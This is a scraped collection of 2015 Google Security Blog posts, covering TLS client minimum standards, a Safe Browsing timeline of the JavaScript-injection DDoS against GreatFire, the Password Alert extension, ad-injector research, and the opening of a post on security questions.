cryptography causes, we are also announcing suggested minimum standards for TLS clients today. This applies to TLS clients in general: certainly those that are using TLS as part of HTTPS, but also, for example, SMTP servers using STARTTLS.        We can't predict the future, but devices that meet these requirements are likely to be able to continue functioning without changes to their TLS configuration up to 2020. You should expect these standards to be required in cases where Google runs certification programs, but it&#8217;s a very good idea to meet them anyway.        Devices that don&#8217;t meet these standards aren&#8217;t going to stop working anytime soon (unless they depend on RC4 or SSLv3&#8212;see above), but they might be affected by further TLS changes in the coming years.        Specifically, we are requiring:        TLS 1.2 must be supported.   A Server Name Indication (SNI) extension must be included in the handshake and must contain the domain that's being connected to.   The cipher suite TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 must be supported with P-256 and uncompressed points.   At least the certificates in  https://pki.google.com/roots.pem  must be trusted.   Certificate handling must be able to support DNS Subject Alternative Names and those SANs may include a single wildcard as the left-most label in the name.           In order to make testing as easy as possible we have set up  https://&#173;cert-test.&#173;sandbox.&#173;google.&#173;com , which requires points 1&#8211;3 to be met in order to make a successful connection. Thus, if your TLS client can&#8217;t connect to that host then you need to update your libraries or configuration.          No longer serving a cross-sign to Equifax          At the moment the certificate chains that Google properties serve most often include a cross-sign from our CA, GeoTrust, to our previous CA, Equifax. This allows clients that only trust our previous CA to continue to function. However, this cross-sign is only a transitional workaround for such clients and we will be removing it in the future. Clients that include our required set of root CAs (at  https://pki.google.com/roots.pem ) will not be affected, but any that don&#8217;t include the needed GeoTrust root may stop working.                                     Posted by Adam Langley, Security Engineer  As the previously announced transition to SHA-256 certificates is nearing completion, we are planning the next changes to Google’s TLS configuration. As part of those changes, we expect to disable support for SSLv3 and RC4 in the medium term.  SSLv3 has been obsolete for over 16 years and is so full of known problems that the IETF has decided that it must no longer be used. RC4 is a 28 year old cipher that has done remarkably well, but is now the subject of multiple attacks at security conferences. The IETF has decided that RC4 also warrants a statement that it too must no longer be used.  Because of these issues we expect to disable both SSLv3 and RC4 support at Google’s frontend servers and, over time, across our products in general, including Chrome, Android, our webcrawlers and our SMTP servers. (Indeed, SSLv3 support has already been removed from Chrome.) The SSL Pulse survey of the top 200,000 HTTPS sites finds that, already, 42% of sites have disabled RC4 and 65% of sites have disabled SSLv3.  If your TLS client, webserver or email server requires the use of SSLv3 or RC4 then the time to update was some years ago, but better late than never. However, note that just because you might be using RC4 today doesn’t mean that your client or website will stop working: TLS can negotiate cipher suites and problems will only occur if you don’t support anything but RC4. (Although if you’re using SSLv3 today then things will stop working when we disable it because SSLv3 is already a last resort.)  Minimum standards for TLS clients  Google's frontend servers do a lot more than terminate connections for browsers these days; there are also lots of embedded systems talking to Google using TLS. In order to reduce the amount of work that the deprecation of outdated cryptography causes, we are also announcing suggested minimum standards for TLS clients today. This applies to TLS clients in general: certainly those that are using TLS as part of HTTPS, but also, for example, SMTP servers using STARTTLS.  We can't predict the future, but devices that meet these requirements are likely to be able to continue functioning without changes to their TLS configuration up to 2020. You should expect these standards to be required in cases where Google runs certification programs, but it’s a very good idea to meet them anyway.  Devices that don’t meet these standards aren’t going to stop working anytime soon (unless they depend on RC4 or SSLv3—see above), but they might be affected by further TLS changes in the coming years.  Specifically, we are requiring:   TLS 1.2 must be supported. A Server Name Indication (SNI) extension must be included in the handshake and must contain the domain that's being connected to. The cipher suite TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 must be supported with P-256 and uncompressed points. At least the certificates in https://pki.google.com/roots.pem must be trusted. Certificate handling must be able to support DNS Subject Alternative Names and those SANs may include a single wildcard as the left-most label in the name.     In order to make testing as easy as possible we have set up https://­cert-test.­sandbox.­google.­com, which requires points 1–3 to be met in order to make a successful connection. Thus, if your TLS client can’t connect to that host then you need to update your libraries or configuration.    No longer serving a cross-sign to Equifax    At the moment the certificate chains that Google properties serve most often include a cross-sign from our CA, GeoTrust, to our previous CA, Equifax. This allows clients that only trust our previous CA to continue to function. However, this cross-sign is only a transitional workaround for such clients and we will be removing it in the future. Clients that include our required set of root CAs (at https://pki.google.com/roots.pem) will not be affected, but any that don’t include the needed GeoTrust root may stop working.     ", "date": "September 17, 2015"},
{"website": "Google-Security", "title": "\nA Javascript-based DDoS Attack as seen by Safe Browsing\n", "author": ["Posted by Niels Provos, Distinguished Engineer, Security Team", "To protect users from malicious content, ", " infrastructure analyzes web pages with web browsers running in virtual machines. This allows us to determine if a page contains malicious content, such as Javascript meant to exploit user machines. While machine learning algorithms select which web pages to inspect, we analyze millions of web pages every day and achieve good coverage of the web in general.", "In the middle of March, ", " ", " reported a large Distributed Denial-of-Service attack against the censorship monitoring organization GreatFire. ", " have extensively analyzed this DoS attack and found it novel because it was conducted by a network operator that intercepted benign web content to inject malicious Javascript. In this particular case, Javascript and HTML resources hosted on ", " were replaced with Javascript that would repeatedly request resources from the attacked domains.", "While Safe Browsing does not observe traffic at the network level, it affords good visibility at the HTTP protocol level. As such our infrastructure picked up this attack, too. Using Safe Browsing data, we can provide a more complete timeline of the attack and shed light on what injections occurred when.", "For this blog post, we analyzed data from March 1st to April 15th 2015. Safe Browsing first noticed injected content against ", " domains on March 3rd, 2015. The last time we observed injections during our measurement period was on April 7th, 2015. This is visible in the graph below, which plots the number of injections over time as a percentage of all injections observed:"], "link": "https://security.googleblog.com/2015/04/a-javascript-based-ddos-attack-as-seen.html", "abstract": "                             Posted by Niels Provos, Distinguished Engineer, Security Team        To protect users from malicious content,  Safe Browsing&#8217;s  infrastructure analyzes web pages with web browsers running in virtual machines. This allows us to determine if a page contains malicious content, such as Javascript meant to exploit user machines. While machine learning algorithms select which web pages to inspect, we analyze millions of web pages every day and achieve good coverage of the web in general.        In the middle of March,  several   sources  reported a large Distributed Denial-of-Service attack against the censorship monitoring organization GreatFire.  Researchers  have extensively analyzed this DoS attack and found it novel because it was conducted by a network operator that intercepted benign web content to inject malicious Javascript. In this particular case, Javascript and HTML resources hosted on  baidu.com  were replaced with Javascript that would repeatedly request resources from the attacked domains.        While Safe Browsing does not observe traffic at the network level, it affords good visibility at the HTTP protocol level. As such our infrastructure picked up this attack, too. Using Safe Browsing data, we can provide a more complete timeline of the attack and shed light on what injections occurred when.        For this blog post, we analyzed data from March 1st to April 15th 2015. Safe Browsing first noticed injected content against  baidu.com  domains on March 3rd, 2015. The last time we observed injections during our measurement period was on April 7th, 2015. This is visible in the graph below, which plots the number of injections over time as a percentage of all injections observed:            We noticed that the attack was carried out in multiple phases. The first phase appeared to be a testing stage and was conducted from March 3rd to March 6th. The initial test target was  114.113.156.119:56789  and the number of requests was artificially limited. From March 4rd to March 6th, the request limitations were removed.    The next phase was conducted between March 10th and 13th and targeted the following IP address at first:  203.90.242.126 . Passive DNS places hosts under the  sinajs.cn  domain at this IP address. On March 13th, the attack was extended to include  d1gztyvw1gvkdq.cloudfront.net . At first, requests were made over HTTP and then upgraded to to use HTTPS. On March 14th, the attack started for real and targeted  d3rkfw22xppori.cloudfront.net  both via HTTP as well as HTTPS. Attacks against this specific host were carried out until March 17th.    On March 18th, the number of hosts under attack was increased to include the following:  d117ucqx7my6vj.cloudfront.net, d14qqseh1jha6e.cloudfront.net, d18yee9du95yb4.cloudfront.net, d19r410x06nzy6.cloudfront.net, d1blw6ybvy6vm2.cloudfront.net . This is also the first time we find truncated injections in which the Javascript is cut-off and non functional. At some point during this phase of the attack, the cloudfront hosts started serving 302 redirects to  greatfire.org  as well as other domains. Substitution of Javascript ceased completely on March 20th but injections into HTML pages continued. Whereas Javascript replacement breaks the functionality of the original content, injection into HTML does not. Here HTML is modified to include both a reference to the original content as well as the attack Javascript as shown below:       &lt;html&gt;    &lt;head&gt;    &lt;meta name=\"referrer\" content=\"never\"/&gt;    &lt;title&gt; &lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;    &nbsp; &nbsp; &nbsp; &lt;iframe src=\"http://pan.baidu.com/s/1i3[...]?t=Zmh4cXpXJApHIDFMcjZa\" style=\"position:absolute; left:0; top:0; height:100%; width:100%; border:0px;\" scrolling=\"yes\"&gt;&lt;/iframe&gt;    &lt;/body&gt;    &lt;script type=\"text/javascript\"&gt;    [... regular attack Javascript ...]     In this technique, the web browser fetches the same HTML page twice but due to the presence of the query parameter t, no injection happens on the second request. The attacked domains also changed and now consisted of:  dyzem5oho3umy.cloudfront.net, d25wg9b8djob8m.cloudfront.net&nbsp;  and   d28d0hakfq6b4n.cloudfront.net . About 10 hours after this new phase started, we see 302 redirects to a different domain served from the targeted servers.    The attack against the cloudfront hosts stops on March 25th. Instead, resources hosted on github.com were now under attack. The first new target was  github.com/greatfire/wiki/wiki/nyt/  and was quickly followed by  github.com/greatfire/  as well as  github.com/greatfire/wiki/wiki/dw/ .    On March 26th, a packed and obfuscated attack Javascript replaced the plain version and started targeting the following resources:  github.com/greatfire/  and  github.com/cn-nytimes/ . Here we also observed some truncated injections. The attack against github seems to have stopped on April 7th, 2015 and marks the last time we saw injections during our measurement period.    From the beginning of March until the attacks stopped in April, we saw 19 unique Javascript replacement payloads as represented by their MD5 sum in the pie chart below.         For the HTML injections, the payloads were unique due to the injected URL so we are not showing their respective MD5 sums. However, the injected Javascript was very similar to the payloads referenced above.    Our systems saw injected content on the following eight baidu.com domains and corresponding IP addresses:        cbjs.baidu.com  (123.125.65.120)    eclick.baidu.com  (123.125.115.164)    hm.baidu.com  (61.135.185.140)    pos.baidu.com  (115.239.210.141)    cpro.baidu.com  (115.239.211.17)    bdimg.share.baidu.com  (211.90.25.48)    pan.baidu.com  (180.149.132.99)    wapbaike.baidu.com  (123.125.114.15)      The sizes of the injected Javascript payloads ranged from 995 to 1325 bytes.    We hope this report helps to round out the overall facts known about this attack. It also demonstrates that collectively there is a lot of visibility into what happens on the web. At the HTTP level seen by Safe Browsing, we cannot confidently attribute this attack to anyone. However, it makes it clear that hiding such attacks from detailed analysis after the fact is difficult.    Had the entire web already moved to encrypted traffic via TLS, such an injection attack would not have been possible. This provides further motivation for transitioning the web to encrypted and integrity-protected communication. Unfortunately, defending against such an attack is not easy for website operators. In this case, the attack Javascript requests web resources sequentially and slowing down responses might have helped with reducing the overall attack traffic. Another hope is that the external visibility of this attack will serve as a deterrent in the future.                                   Posted by Niels Provos, Distinguished Engineer, Security Team  To protect users from malicious content, Safe Browsing’s infrastructure analyzes web pages with web browsers running in virtual machines. This allows us to determine if a page contains malicious content, such as Javascript meant to exploit user machines. While machine learning algorithms select which web pages to inspect, we analyze millions of web pages every day and achieve good coverage of the web in general.  In the middle of March, several sources reported a large Distributed Denial-of-Service attack against the censorship monitoring organization GreatFire. Researchers have extensively analyzed this DoS attack and found it novel because it was conducted by a network operator that intercepted benign web content to inject malicious Javascript. In this particular case, Javascript and HTML resources hosted on baidu.com were replaced with Javascript that would repeatedly request resources from the attacked domains.  While Safe Browsing does not observe traffic at the network level, it affords good visibility at the HTTP protocol level. As such our infrastructure picked up this attack, too. Using Safe Browsing data, we can provide a more complete timeline of the attack and shed light on what injections occurred when.  For this blog post, we analyzed data from March 1st to April 15th 2015. Safe Browsing first noticed injected content against baidu.com domains on March 3rd, 2015. The last time we observed injections during our measurement period was on April 7th, 2015. This is visible in the graph below, which plots the number of injections over time as a percentage of all injections observed:  We noticed that the attack was carried out in multiple phases. The first phase appeared to be a testing stage and was conducted from March 3rd to March 6th. The initial test target was 114.113.156.119:56789 and the number of requests was artificially limited. From March 4rd to March 6th, the request limitations were removed.  The next phase was conducted between March 10th and 13th and targeted the following IP address at first: 203.90.242.126. Passive DNS places hosts under the sinajs.cn domain at this IP address. On March 13th, the attack was extended to include d1gztyvw1gvkdq.cloudfront.net. At first, requests were made over HTTP and then upgraded to to use HTTPS. On March 14th, the attack started for real and targeted d3rkfw22xppori.cloudfront.net both via HTTP as well as HTTPS. Attacks against this specific host were carried out until March 17th.  On March 18th, the number of hosts under attack was increased to include the following: d117ucqx7my6vj.cloudfront.net, d14qqseh1jha6e.cloudfront.net, d18yee9du95yb4.cloudfront.net, d19r410x06nzy6.cloudfront.net, d1blw6ybvy6vm2.cloudfront.net. This is also the first time we find truncated injections in which the Javascript is cut-off and non functional. At some point during this phase of the attack, the cloudfront hosts started serving 302 redirects to greatfire.org as well as other domains. Substitution of Javascript ceased completely on March 20th but injections into HTML pages continued. Whereas Javascript replacement breaks the functionality of the original content, injection into HTML does not. Here HTML is modified to include both a reference to the original content as well as the attack Javascript as shown below:                             [... regular attack Javascript ...]  In this technique, the web browser fetches the same HTML page twice but due to the presence of the query parameter t, no injection happens on the second request. The attacked domains also changed and now consisted of: dyzem5oho3umy.cloudfront.net, d25wg9b8djob8m.cloudfront.net and d28d0hakfq6b4n.cloudfront.net. About 10 hours after this new phase started, we see 302 redirects to a different domain served from the targeted servers.  The attack against the cloudfront hosts stops on March 25th. Instead, resources hosted on github.com were now under attack. The first new target was github.com/greatfire/wiki/wiki/nyt/ and was quickly followed by github.com/greatfire/ as well as github.com/greatfire/wiki/wiki/dw/.  On March 26th, a packed and obfuscated attack Javascript replaced the plain version and started targeting the following resources: github.com/greatfire/ and github.com/cn-nytimes/. Here we also observed some truncated injections. The attack against github seems to have stopped on April 7th, 2015 and marks the last time we saw injections during our measurement period.  From the beginning of March until the attacks stopped in April, we saw 19 unique Javascript replacement payloads as represented by their MD5 sum in the pie chart below.  For the HTML injections, the payloads were unique due to the injected URL so we are not showing their respective MD5 sums. However, the injected Javascript was very similar to the payloads referenced above.  Our systems saw injected content on the following eight baidu.com domains and corresponding IP addresses:   cbjs.baidu.com (123.125.65.120) eclick.baidu.com (123.125.115.164) hm.baidu.com (61.135.185.140) pos.baidu.com (115.239.210.141) cpro.baidu.com (115.239.211.17) bdimg.share.baidu.com (211.90.25.48) pan.baidu.com (180.149.132.99) wapbaike.baidu.com (123.125.114.15)   The sizes of the injected Javascript payloads ranged from 995 to 1325 bytes.  We hope this report helps to round out the overall facts known about this attack. It also demonstrates that collectively there is a lot of visibility into what happens on the web. At the HTTP level seen by Safe Browsing, we cannot confidently attribute this attack to anyone. However, it makes it clear that hiding such attacks from detailed analysis after the fact is difficult.  Had the entire web already moved to encrypted traffic via TLS, such an injection attack would not have been possible. This provides further motivation for transitioning the web to encrypted and integrity-protected communication. Unfortunately, defending against such an attack is not easy for website operators. In this case, the attack Javascript requests web resources sequentially and slowing down responses might have helped with reducing the overall attack traffic. Another hope is that the external visibility of this attack will serve as a deterrent in the future.     ", "date": "April 24, 2015"},
{"website": "Google-Security", "title": "\nProtect your Google Account with Password Alert\n", "author": ["Posted by Drew Hintz, Security Engineer and Justin Kosslyn, Google Ideas", "\n"], "link": "https://security.googleblog.com/2015/04/protect-your-google-account-with.html", "abstract": "                             Posted by Drew Hintz, Security Engineer and Justin Kosslyn, Google Ideas         [Cross-posted on the  Official Google Blog ]         Would you enter your email address and password on this page?           This looks like a fairly standard login page, but it&#8217;s not. It&#8217;s what we call a &#8220;phishing&#8221; page, a site run by people looking to receive and steal your password. If you type your password here, attackers could steal it and gain access to your Google Account&#8212;and you may not even know it. This is a common and dangerous trap: the most effective phishing attacks can succeed  45 percent of the time , nearly 2 percent of messages to Gmail are designed to trick people into giving up their passwords, and various services across the web send millions upon millions of phishing emails, every day.         To help keep your account safe, today we&#8217;re launching Password Alert, a  free, open-source Chrome extension  that protects your Google and Google Apps for Work Accounts. Once you&#8217;ve installed it, Password Alert will show you a warning if you type your Google password into a site that isn&#8217;t a Google sign-in page. This protects you from phishing attacks and also encourages you to use different passwords for different sites, a security best practice.         Here's how it works for consumer accounts. Once you&#8217;ve installed and initialized Password Alert, Chrome will remember a &#8220;scrambled&#8221; version of your Google Account password. It only remembers this information for security purposes and doesn&#8217;t share it with anyone. If you type your password into a site that isn't a Google sign-in page, Password Alert will show you a notice like the one below. This alert will tell you that you&#8217;re at risk of being phished so you can update your password and protect yourself.           Password Alert is also available to Google for Work customers, including Google Apps and Drive for Work. Your administrator can install Password Alert for everyone in the domains they manage, and receive alerts when Password Alert detects a possible problem. This can help spot malicious attackers trying to break into employee accounts and also reduce password reuse. Administrators can find more information  in the Help Center .           We work to protect users from phishing attacks in a variety of ways. We&#8217;re constantly improving our  Safe Browsing  technology, which protects more than 1 billion people on Chrome, Safari and Firefox from phishing and other dangerous sites via bright, red warnings. We also offer tools like  2-Step Verification  and  Security Key  that people can use to protect their Google Accounts and stay safe online. And of course, you can also take a  Security Checkup  at any time to make sure the safety and security information associated with your account is current.&nbsp;         To get started with Password Alert, visit the  Chrome Web Store  or the  FAQ .                                     Posted by Drew Hintz, Security Engineer and Justin Kosslyn, Google Ideas  [Cross-posted on the Official Google Blog]   Would you enter your email address and password on this page?    This looks like a fairly standard login page, but it’s not. It’s what we call a “phishing” page, a site run by people looking to receive and steal your password. If you type your password here, attackers could steal it and gain access to your Google Account—and you may not even know it. This is a common and dangerous trap: the most effective phishing attacks can succeed 45 percent of the time, nearly 2 percent of messages to Gmail are designed to trick people into giving up their passwords, and various services across the web send millions upon millions of phishing emails, every day.    To help keep your account safe, today we’re launching Password Alert, a free, open-source Chrome extension that protects your Google and Google Apps for Work Accounts. Once you’ve installed it, Password Alert will show you a warning if you type your Google password into a site that isn’t a Google sign-in page. This protects you from phishing attacks and also encourages you to use different passwords for different sites, a security best practice.    Here's how it works for consumer accounts. Once you’ve installed and initialized Password Alert, Chrome will remember a “scrambled” version of your Google Account password. It only remembers this information for security purposes and doesn’t share it with anyone. If you type your password into a site that isn't a Google sign-in page, Password Alert will show you a notice like the one below. This alert will tell you that you’re at risk of being phished so you can update your password and protect yourself.    Password Alert is also available to Google for Work customers, including Google Apps and Drive for Work. Your administrator can install Password Alert for everyone in the domains they manage, and receive alerts when Password Alert detects a possible problem. This can help spot malicious attackers trying to break into employee accounts and also reduce password reuse. Administrators can find more information in the Help Center.    We work to protect users from phishing attacks in a variety of ways. We’re constantly improving our Safe Browsing technology, which protects more than 1 billion people on Chrome, Safari and Firefox from phishing and other dangerous sites via bright, red warnings. We also offer tools like 2-Step Verification and Security Key that people can use to protect their Google Accounts and stay safe online. And of course, you can also take a Security Checkup at any time to make sure the safety and security information associated with your account is current.     To get started with Password Alert, visit the Chrome Web Store or the FAQ.     ", "date": "April 29, 2015"},
{"website": "Google-Security", "title": "\nNew Research: The Ad Injection Economy\n", "author": ["Posted by Kurt Thomas, Spam & Abuse Research", "In March, we ", " the problems with unwanted ad injectors, a common symptom of ", ". Ad injectors are programs that insert new ads, or replace existing ones, into the pages you visit while browsing the web. We’ve received more than 100,000 user complaints about them in Chrome since the beginning of 2015—more than any other issue. Unwanted ad injectors are not only annoying, they can pose ", " to users as well."], "link": "https://security.googleblog.com/2015/05/new-research-ad-injection-economy.html", "abstract": "                             Posted by Kurt Thomas, Spam &amp; Abuse Research        In March, we  outlined  the problems with unwanted ad injectors, a common symptom of  unwanted software . Ad injectors are programs that insert new ads, or replace existing ones, into the pages you visit while browsing the web. We&#8217;ve received more than 100,000 user complaints about them in Chrome since the beginning of 2015&#8212;more than any other issue. Unwanted ad injectors are not only annoying, they can pose  serious security risks  to users as well.     Today, we&#8217;re releasing the results of a study performed with the University of California, Berkeley and Santa Barbara that examines the ad injector ecosystem, in-depth, for the first time. We&#8217;ve summarized our key findings below, as well as Google&#8217;s broader efforts to protect users from unwanted software. The full report, which you can read  here , will be presented later this month at the  IEEE Symposium on Security &amp; Privacy .    Ad injectors&#8217; businesses are built on a tangled web of different players in the online advertising economy. This complexity has made it difficult for the industry to understand this issue and help fix it. We hope our findings raise broad awareness of this problem and enable the online advertising industry to work together and tackle it.     How big is the problem?             This is what users might see if their browsers were infected with ad injectors. None of the ads displayed appear without an ad injector installed.          To pursue this research, we custom-built an ad injection &#8220;detector&#8221; for Google sites. This tool helped us identify tens of millions of instances of ad injection &#8220;in the wild&#8221; over the course of several months in 2014, the duration of our study.         More detail is below, but the main point is clear: deceptive ad injection is a significant problem on the web today. We found 5.5% of unique IPs&#8212;millions of users&#8212;accessing Google sites that included some form of injected ads.          How ad injectors work     The ad injection ecosystem comprises a tangled web of different players. Here is a quick snapshot.          Software : It all starts with software that infects your browser. We discovered more than 50,000 browser extensions and more than 34,000 software applications that took control of users&#8217; browsers and injected ads. Upwards of 30% of these packages were outright malicious and simultaneously stole account credentials, hijacked search queries, and reported a user&#8217;s activity to third parties for tracking. In total, we found 5.1% of page views on Windows and 3.4% of page views on Mac that showed tell-tale signs of ad injection software.    Distribution : Next, this software is distributed by a network of affiliates that work to drive as many installs as possible via tactics like: marketing, bundling applications with popular downloads, outright malware distribution, and large social advertising campaigns. Affiliates are paid a commision whenever a user clicks on an injected ad. We found about 1,000 of these businesses, including Crossrider, Shopper Pro, and Netcrawl, that use at least one of these tactics.    Injection Libraries:  Ad injectors source their ads from about 25 businesses that provide &#8216;injection libraries&#8217;. Superfish and Jollywallet are by far the most popular of these, appearing in 3.9% and 2.4% of Google views, respectively. These companies manage advertising relationships with a handful of ad networks and shopping programs and decide which ads to display to users. Whenever a user clicks on an ad or purchases a product, these companies make a profit, a fraction of which they share with affiliates.    Ads : The ad injection ecosystem profits from more than 3,000 victimized advertisers&#8212;including major retailers like Sears, Walmart, Target, Ebay&#8212;who unwittingly pay for traffic to their sites. Because advertisers are generally only able to measure the final click that drives traffic to their sites, they&#8217;re often unaware of many preceding twists and turns, and don&#8217;t know they are receiving traffic via unwanted software and malware. Ads originate from ad networks that translate unwanted software installations into profit: 77% of all injected ads go through one of three ad networks&#8212;dealtime.com, pricegrabber.com, and bizrate.com. Publishers, meanwhile, aren&#8217;t being compensated for these ads.              Examples of injected ads &#8216;in the wild&#8217;             How Google fights deceptive ad injectors &nbsp;    We pursued this research to raise awareness about the ad injection economy so that the broader ads ecosystem can better understand this complex issue and work together to tackle it.         Based on our findings, we took the following actions:          Keeping the Chrome Web Store clean:  We removed 192 deceptive Chrome extensions that affected 14 million users with ad injection from the Chrome Web Store. These extensions violated Web Store policies that extensions have a  narrow and easy-to-understand purpose . We&#8217;ve also deployed new safeguards in the Chrome Web Store to help protect users from deceptive ad injection extensions.    Protecting Chrome users:  We improved protections in Chrome to  flag unwanted software  and display familiar red warnings when users are about to download deceptive software. These same protections are broadly available via the  Safe Browsing API . We also  provide a tool  for users already affected by ad injectors and other unwanted software to clean up their Chrome browser.    Informing advertisers:  We reached out to the advertisers affected by ad injection to alert each of the deceptive practices and ad networks involved. This reflects a broader set of  Google Platforms program policies  and the  DoubleClick Ad Exchange (AdX) Seller Program Guidelines  that prohibit programs overlaying ad space on a given site without permission of the site owner.           Most recently, we  updated  our AdWords policies to make it more difficult for advertisers to promote unwanted software on AdWords. It's still early, but we've already seen encouraging results since making the change: the number of 'Safe Browsing' warnings that users receive in Chrome after clicking AdWords ads has dropped by more than 95%. This suggests it's become much more difficult for users to download unwanted software, and for bad advertisers to promote it. Our  blog post  from March outlines various policies&#8212;for the Chrome Web Store, AdWords, Google Platforms program, and the DoubleClick Ad Exchange (AdX)&#8212;that combat unwanted ad injectors, across products.         We&#8217;re also constantly improving our  Safe Browsing  technology, which protects more than one billion Chrome, Safari, and Firefox users across the web from phishing, malware, and unwanted software. Today, Safe Browsing shows people  more than 5 million warnings per day  for all sorts of malicious sites and unwanted software, and discovers more than 50,000 malware sites and more than 90,000 phishing sites every month.         Considering the tangle of different businesses involved&#8212;knowingly, or unknowingly&#8212;in the ad injector ecosystem, progress will only be made if we raise our standards, together. We strongly encourage all members of the ads ecosystem to review their policies and practices so we can make real improvement on this issue.                                       Posted by Kurt Thomas, Spam & Abuse Research  In March, we outlined the problems with unwanted ad injectors, a common symptom of unwanted software. Ad injectors are programs that insert new ads, or replace existing ones, into the pages you visit while browsing the web. We’ve received more than 100,000 user complaints about them in Chrome since the beginning of 2015—more than any other issue. Unwanted ad injectors are not only annoying, they can pose serious security risks to users as well.  Today, we’re releasing the results of a study performed with the University of California, Berkeley and Santa Barbara that examines the ad injector ecosystem, in-depth, for the first time. We’ve summarized our key findings below, as well as Google’s broader efforts to protect users from unwanted software. The full report, which you can read here, will be presented later this month at the IEEE Symposium on Security & Privacy.  Ad injectors’ businesses are built on a tangled web of different players in the online advertising economy. This complexity has made it difficult for the industry to understand this issue and help fix it. We hope our findings raise broad awareness of this problem and enable the online advertising industry to work together and tackle it.  How big is the problem?    This is what users might see if their browsers were infected with ad injectors. None of the ads displayed appear without an ad injector installed.    To pursue this research, we custom-built an ad injection “detector” for Google sites. This tool helped us identify tens of millions of instances of ad injection “in the wild” over the course of several months in 2014, the duration of our study.    More detail is below, but the main point is clear: deceptive ad injection is a significant problem on the web today. We found 5.5% of unique IPs—millions of users—accessing Google sites that included some form of injected ads.    How ad injectors work  The ad injection ecosystem comprises a tangled web of different players. Here is a quick snapshot.    Software: It all starts with software that infects your browser. We discovered more than 50,000 browser extensions and more than 34,000 software applications that took control of users’ browsers and injected ads. Upwards of 30% of these packages were outright malicious and simultaneously stole account credentials, hijacked search queries, and reported a user’s activity to third parties for tracking. In total, we found 5.1% of page views on Windows and 3.4% of page views on Mac that showed tell-tale signs of ad injection software. Distribution: Next, this software is distributed by a network of affiliates that work to drive as many installs as possible via tactics like: marketing, bundling applications with popular downloads, outright malware distribution, and large social advertising campaigns. Affiliates are paid a commision whenever a user clicks on an injected ad. We found about 1,000 of these businesses, including Crossrider, Shopper Pro, and Netcrawl, that use at least one of these tactics. Injection Libraries: Ad injectors source their ads from about 25 businesses that provide ‘injection libraries’. Superfish and Jollywallet are by far the most popular of these, appearing in 3.9% and 2.4% of Google views, respectively. These companies manage advertising relationships with a handful of ad networks and shopping programs and decide which ads to display to users. Whenever a user clicks on an ad or purchases a product, these companies make a profit, a fraction of which they share with affiliates. Ads: The ad injection ecosystem profits from more than 3,000 victimized advertisers—including major retailers like Sears, Walmart, Target, Ebay—who unwittingly pay for traffic to their sites. Because advertisers are generally only able to measure the final click that drives traffic to their sites, they’re often unaware of many preceding twists and turns, and don’t know they are receiving traffic via unwanted software and malware. Ads originate from ad networks that translate unwanted software installations into profit: 77% of all injected ads go through one of three ad networks—dealtime.com, pricegrabber.com, and bizrate.com. Publishers, meanwhile, aren’t being compensated for these ads.     Examples of injected ads ‘in the wild’    How Google fights deceptive ad injectors   We pursued this research to raise awareness about the ad injection economy so that the broader ads ecosystem can better understand this complex issue and work together to tackle it.    Based on our findings, we took the following actions:    Keeping the Chrome Web Store clean: We removed 192 deceptive Chrome extensions that affected 14 million users with ad injection from the Chrome Web Store. These extensions violated Web Store policies that extensions have a narrow and easy-to-understand purpose. We’ve also deployed new safeguards in the Chrome Web Store to help protect users from deceptive ad injection extensions. Protecting Chrome users: We improved protections in Chrome to flag unwanted software and display familiar red warnings when users are about to download deceptive software. These same protections are broadly available via the Safe Browsing API. We also provide a tool for users already affected by ad injectors and other unwanted software to clean up their Chrome browser. Informing advertisers: We reached out to the advertisers affected by ad injection to alert each of the deceptive practices and ad networks involved. This reflects a broader set of Google Platforms program policies and the DoubleClick Ad Exchange (AdX) Seller Program Guidelines that prohibit programs overlaying ad space on a given site without permission of the site owner.     Most recently, we updated our AdWords policies to make it more difficult for advertisers to promote unwanted software on AdWords. It's still early, but we've already seen encouraging results since making the change: the number of 'Safe Browsing' warnings that users receive in Chrome after clicking AdWords ads has dropped by more than 95%. This suggests it's become much more difficult for users to download unwanted software, and for bad advertisers to promote it. Our blog post from March outlines various policies—for the Chrome Web Store, AdWords, Google Platforms program, and the DoubleClick Ad Exchange (AdX)—that combat unwanted ad injectors, across products.    We’re also constantly improving our Safe Browsing technology, which protects more than one billion Chrome, Safari, and Firefox users across the web from phishing, malware, and unwanted software. Today, Safe Browsing shows people more than 5 million warnings per day for all sorts of malicious sites and unwanted software, and discovers more than 50,000 malware sites and more than 90,000 phishing sites every month.    Considering the tangle of different businesses involved—knowingly, or unknowingly—in the ad injector ecosystem, progress will only be made if we raise our standards, together. We strongly encourage all members of the ads ecosystem to review their policies and practices so we can make real improvement on this issue.      ", "date": "May 6, 2015"},
{"website": "Google-Security", "title": "\nNew Research: Some Tough Questions for ‘Security Questions’\n", "author": ["Posted by Elie Bursztein, Anti-Abuse Research Lead and Ilan Caron, Software Engineer", "What do these seemingly random questions have in common? They’re all familiar examples of ‘security questions’. Chances are you’ve had to answer one these before; many online services use them to help users recover access to accounts if they forget their passwords, or as an additional layer of security to ", ".", "But, despite the prevalence of security questions, their safety and effectiveness have rarely been studied in depth. As part of our constant efforts to improve account security, we analyzed hundreds of millions of secret questions and answers that had been used for millions of account recovery claims at Google. We then worked to measure the likelihood that hackers could guess the answers.", "Our findings, summarized in a ", " that we recently presented at ", ", led us to conclude that secret questions are neither secure nor reliable enough to be used as a standalone account recovery mechanism. That’s because they suffer from a fundamental flaw: their answers are either somewhat secure or easy to remember—but rarely both.", "Not surprisingly, easy-to-remember answers are less secure. Easy answers often contain commonly known or publicly available information, or are in a small set of possible answers for cultural reasons (ie, a common family name in certain countries).", "Here are some specific insights:"], "link": "https://security.googleblog.com/2015/05/new-research-some-tough-questions-for.html", "abstract": "                             Posted by Elie Bursztein, Anti-Abuse Research Lead and Ilan Caron, Software Engineer         What was your first pet&#8217;s name?      What is your favorite food?      What is your mother&#8217;s maiden name?         What do these seemingly random questions have in common? They&#8217;re all familiar examples of &#8216;security questions&#8217;. Chances are you&#8217;ve had to answer one these before; many online services use them to help users recover access to accounts if they forget their passwords, or as an additional layer of security to  protect against suspicious logins .        But, despite the prevalence of security questions, their safety and effectiveness have rarely been studied in depth. As part of our constant efforts to improve account security, we analyzed hundreds of millions of secret questions and answers that had been used for millions of account recovery claims at Google. We then worked to measure the likelihood that hackers could guess the answers.        Our findings, summarized in a  paper  that we recently presented at  WWW 2015 , led us to conclude that secret questions are neither secure nor reliable enough to be used as a standalone account recovery mechanism. That&#8217;s because they suffer from a fundamental flaw: their answers are either somewhat secure or easy to remember&#8212;but rarely both.                     Click infographic for larger version            Easy Answers 